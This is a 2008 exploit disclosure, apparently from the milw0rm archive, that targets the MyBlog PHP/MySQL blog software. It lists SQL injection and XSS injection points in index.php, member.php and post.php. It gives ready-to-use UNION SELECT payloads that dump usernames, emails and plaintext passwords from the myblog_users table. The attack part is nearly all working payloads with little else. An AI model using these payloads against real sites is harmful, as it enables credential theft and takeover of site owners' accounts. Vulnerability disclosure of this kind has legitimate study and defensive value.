@@ -1,0 +1,67 @@
+=====================================================================================
+  MyBlog: PHP and MySQL Blog/CMS software (SQL/XSS) Multiple Remote Vulnerabilities
+=====================================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 23 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : MyBlog: PHP and MySQL Blog/CMS software
+ DOWNLOAD    : http://downloads.sourceforge.net/myblog
+#####################################################
+
+--- Remote SQL Injection ---
+
+** Magic Quote must turn off **
+
+----------
+ Exploits
+----------
+
+[+] http://[Target]/os/index.php?view=[SQL Injection]
+[+] http://[Target]/os/member.php?id=[SQL Injection]
+[+] http://[Target]/os/post.php?id=[SQL Injection]
+
+   **This exploits can get username and password (No Encryption)**
+
+--------------
+ POC Exploits
+--------------
+
+[+] http://192.168.24.25/os/index.php?view=cwh'/**/UNION/**/SELECT/**/1,2,email,concat(user,0x3a,password),5,6,7,8,9,10,11/**/FROM/**/myblog_users/**/WHERE/**/perm='1
+[+] http://192.168.24.25/os/member.php?id=-9999'/**/UNION/**/SELECT/**/concat(user,0x3a,password),2,3,email,5,6,7,8,9,10/**/FROM/**/myblog_users/**/WHERE/**/perm='1
+[+] http://192.168.24.25/os/post.php?id=-9999'/**/UNION/**/SELECT/**/1,2,email,concat(user,0x3a,password),5,6,7,8,9,10,11/**/FROM/**/myblog_users/**/WHERE/**/perm='1
+
+
+
+--- Remote XSS ---
+
+----------
+ Exploits
+----------
+
+[+] http://[Target]/os/index.php?s=[XSS]
+[+] http://[Target]/os/index.php?sort=[XSS]
+[+] http://[Target]/os/post.php?id=[XSS]
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-23]
